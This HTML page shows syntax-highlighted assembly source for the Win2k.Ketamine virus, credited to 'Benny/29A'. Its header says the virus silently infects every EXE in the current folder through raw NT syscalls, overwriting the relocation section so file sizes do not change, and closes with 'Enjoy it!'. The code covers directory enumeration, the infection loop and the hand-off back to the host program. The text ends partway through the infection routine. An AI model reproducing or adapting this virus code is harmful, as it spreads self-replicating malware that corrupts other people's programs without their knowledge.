<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Ketan - ketamine.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; COMMENT#</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                            збббббббббббббббббббббббббб©</span><span class="sc0">
</span><span class="sc1">;                            цееееееееееееееееееееееееее╢ </span><span class="sc0">
</span><span class="sc1">;                            цееееааааааааааааааааааееее╢ </span><span class="sc0">
</span><span class="sc1">;                            цеее╢  Win2k.Ketamine  цеее╢ </span><span class="sc0">
</span><span class="sc1">;                            цеее╢   by Benny/29A   цеее╢</span><span class="sc0">
</span><span class="sc1">;                            цееееббббббббббббббббббееее╢</span><span class="sc0">
</span><span class="sc1">;                            цееееееееееееееееееееееееее╢</span><span class="sc0">
</span><span class="sc1">;                            юааааааааааааааааааааааааааы</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; This is my next (very small) virus, specialised on Win2k machinez. It should be also</span><span class="sc0">
</span><span class="sc1">; able to run under WinNT machinez, but I'm not sure, becoz I didn't test it. The virus</span><span class="sc0">
</span><span class="sc1">; does not use any APIz, instead of that, its uses NT syscallz. The virus does not do</span><span class="sc0">
</span><span class="sc1">; anything special apart of that, it can only infect all EXE filez in current folder</span><span class="sc0">
</span><span class="sc1">; and does not manifest itself in any way. Infected filez have the same size, becoz</span><span class="sc0">
</span><span class="sc1">; virus overwritez the relocation section. The virus should be compatible with newer</span><span class="sc0">
</span><span class="sc1">; versionz of Windows OS'ez based on NT system. The only point of incompatibility is,</span><span class="sc0">
</span><span class="sc1">; becoz I decided to not use ANY API, the code where the virus expect the fixed address</span><span class="sc0">
</span><span class="sc1">; of NTDLL.dll modul loaded in process virtual memory. Virus searchez inside the NTDLL.dll</span><span class="sc0">
</span><span class="sc1">; for syscall numberz and so it SHOULD be forward compatible. At least a bit...;-)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Here I have to thank Ratter, he inspired me a lot with his Win2k.Joss. The functionality</span><span class="sc0">
</span><span class="sc1">; of Win2k.Ketamine and Win2k.Joss is almost the same, I only recoded some of his code on my</span><span class="sc0">
</span><span class="sc1">; own and added a few new ideaz, which should make Ketamine more compatible with Windows,</span><span class="sc0">
</span><span class="sc1">; rather than Joss. I have to say, that he inspired me a lot, but the code is not ripped. I</span><span class="sc0">
</span><span class="sc1">; also disassembled NTDLL.dll and NTOSKRNL.EXE and found the same resultz as him, surprisely ;-D</span><span class="sc0">
</span><span class="sc1">; But ofcoz, I decided to not discover the America again and so I used some of his code in</span><span class="sc0">
</span><span class="sc1">; my virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus was coded only to show that something is possible, not to make high-spreading virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Enjoy it!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (c)oded in August, 2001</span><span class="sc0">
</span><span class="sc1">; Czech Republic.</span><span class="sc0">
</span><span class="sc1">; #</span><span class="sc0">





</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">


</span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc0">             </span><span class="sc1">;macro for API callz</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">api</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">api</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">unicode_string</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">us_length</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;length of the string</span><span class="sc0">
    </span><span class="sc5">us_pstring</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;ptr to string</span><span class="sc0">
</span><span class="sc5">unicode_string</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">path</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">p_path</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;maximal length of path in unicode</span><span class="sc0">
</span><span class="sc5">path</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">object_attributes</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">oa_length</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;length of structure</span><span class="sc0">
    </span><span class="sc5">oa_rootdir</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">oa_objectname</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;name of object</span><span class="sc0">
    </span><span class="sc5">oa_attribz</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;attributez of the object</span><span class="sc0">
    </span><span class="sc5">oa_secdesc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">oa_secqos</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">object_attributes</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">pio_status</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">               </span><span class="sc1">;status structure</span><span class="sc0">
    </span><span class="sc5">ps_ntstatus</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ps_info</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pio_status</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;some data</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">_Start</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;delta offset</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">             </span><span class="sc1">;must be under winNT/2k!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_syscalls</span><span class="sc0">            </span><span class="sc1">;get numberz of all needed syscallz</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">uni_string</span><span class="sc4">:</span><span class="sc5">unicode_string</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">u_string</span><span class="sc4">:</span><span class="sc5">path</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">object_attr</span><span class="sc4">:</span><span class="sc5">object_attributes</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">io_status</span><span class="sc4">:</span><span class="sc5">pio_status</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">dHandle</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">WFD</span><span class="sc4">:</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">uni_string.us_length</span><span class="sc4">],</span><span class="sc2">80008h</span><span class="sc0">   </span><span class="sc1">;length of the string</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">u_string</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">uni_string.us_pstring</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;set the pointer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@qm</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'\','</span><span class="sc10">?</span><span class="sc12">','</span><span class="sc10">?</span><span class="sc12">','</span><span class="sc0">\</span><span class="sc13">'         ;initial string of the object
</span><span class="sc5">@qm</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">                   </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;ESI = current folder</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">l_copy</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;append it</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l_copy</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">uni_string</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;save the new length</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;initialize the structure ...</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">uni_string</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">object_attr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_length</span><span class="sc4">],</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_rootdir</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_objectname</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_attribz</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_secdesc</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.oa_secqos</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4021h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">io_status</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100001h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">dHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NtOpenFile</span><span class="sc0">          </span><span class="sc1">;open the current folder</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">f_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@p1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0A000Ah</span><span class="sc0">             </span><span class="sc1">;length of the string</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;ptr to string</span><span class="sc0">
</span><span class="sc5">@p1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@exe</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'&lt;'</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">     </span><span class="sc1">;string</span><span class="sc0">
</span><span class="sc5">@exe</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save the ptr</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@1st</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">@1st</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">io_status</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtQDF</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;NtQueryDirectoryFile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">11</span><span class="sc0">            </span><span class="sc1">;correct the stack</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_loop</span><span class="sc0">              </span><span class="sc1">;quit if no more file</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">uni_string</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;save the length</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">WFD</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;WIN32_FIND_DATA structure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">uni_string</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;the filename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">         </span><span class="sc1">;infect the file</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">uni_string</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;restore the length</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">f_loop</span><span class="sc0">              </span><span class="sc1">;find next file</span><span class="sc0">

</span><span class="sc5">e_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">NtClose</span><span class="sc0">             </span><span class="sc1">;close the directory</span><span class="sc0">

    </span><span class="sc6">leave</span><span class="sc0">
</span><span class="sc5">end_seh</span><span class="sc4">:</span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc5">original_ep</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">;jump to host!</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">



</span><span class="sc5">NtClose</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtC</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;close the handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">NtOpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NtOF</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">             </span><span class="sc1">;open the object</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc0">



</span><span class="sc5">infect_file</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">object_attr</span><span class="sc4">:</span><span class="sc5">object_attributes</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">io_status</span><span class="sc4">:</span><span class="sc5">pio_status</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">fHandle</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">sHandle</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">sOffset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">bytez</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">sOffset2</span><span class="sc4">:</span><span class="sc10">QWORD</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">if_end</span><span class="sc4">&gt;</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;EDI - end of string</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;size of filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
